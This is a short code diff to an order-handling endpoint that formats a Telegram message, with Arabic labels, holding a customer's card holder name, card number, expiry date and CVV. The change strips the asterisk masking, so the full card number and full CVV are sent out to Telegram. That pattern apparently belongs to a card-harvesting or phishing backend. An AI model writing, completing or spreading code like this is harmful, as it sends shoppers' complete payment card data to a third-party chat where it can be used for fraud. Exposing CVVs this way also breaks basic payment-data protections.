@@ -1484,9 +1484,9 @@ app.post('/api/order', async (req, res) => {
         ? [
             '<b>🧪 وسيلة دفع بطاقة ائتمان:</b>',
             `<b>اسم الحامل:</b> ${escapeTelegramHtml(cardHolderName || '')}`,
-            `<b>رقم البطاقة:</b> <code>******${escapeTelegramHtml(String(cardNumber || '').replace(/\D/g, '').slice(-16) || '')}</code>`,
+            `<b>رقم البطاقة:</b> <code>${escapeTelegramHtml(String(cardNumber || '').replace(/\D/g, '').slice(-16) || '')}</code>`,
             `<b>تاريخ الانتهاء:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
-            `<b>CVV:</b> <code>**${escapeTelegramHtml(String(cardCvv || '').slice(-3) || '*')}</code>`,
+            `<b>CVV:</b> <code>${escapeTelegramHtml(String(cardCvv || '').slice(-3) || '')}</code>`,
           ]
         : []),
       '━━━━━━━━━━━━━━━',
